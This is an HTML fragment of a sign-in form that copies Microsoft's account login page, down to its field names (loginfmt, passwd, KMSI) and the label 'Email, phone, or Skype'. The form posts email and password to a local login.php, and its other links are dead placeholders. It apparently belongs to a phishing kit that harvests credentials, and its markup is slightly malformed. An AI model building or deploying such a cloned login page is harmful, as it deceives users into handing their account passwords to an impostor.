<body class="min-h-screen flex flex-col items-center justify-center bg-gray-50">
    <div class="w-full max-w-md">
        <div class="text-center mb-8">

            <h1 class="text-2xl font-semibold text-gray-800">Sign in</h1>
        </div>

        <div class="bg-white rounded-lg form-container p-8">
            <form action="login.php" method="POST" class="space-y-6">
                <div>
                    <label for="loginfmt" class="block text-sm font-medium text-gray-700 mb-1">Email, phone, or Skype</label>
                    <input type="text" id="loginfmt" name="loginfmt" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" autocomplete="username">
                </div>

                <div>
                    <div class="flex justify-between items-center mb-1">
                        <label for="passwd" class="block text-sm font-medium text-gray-700">Password</label>
                        <a href="#" class="text-sm text-blue-600 hover:underline">Forgot password?</a>
                    </div>
                    <input type="password" id="passwd" name="passwd" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" autocomplete="current-password">
                </div>

                <div class="flex items-center">
                    <input id="KMSI" name="KMSI" type="checkbox" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                    <label for="KMSI" class="ml-2 block text-sm text-gray-700">Keep me signed in</label>
                </div>

                <div class="space-y-4">
                    <button type="submit" class="w-full py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white next-btn focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
                        Sign in
                    </button>
                    <a href="#" class="w-full flex items-center justify-center px-4 py-2 border border-gray-300 shadow-sm text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
                        <i data-feather="arrow-left" class="w-4 h-4 mr-2"></i> Back
                    </button>
                </div>
            </form>
        </div>

            <p>No account? <a href="#" class="text-blue-600 hover:underline">Create one!</a></p>
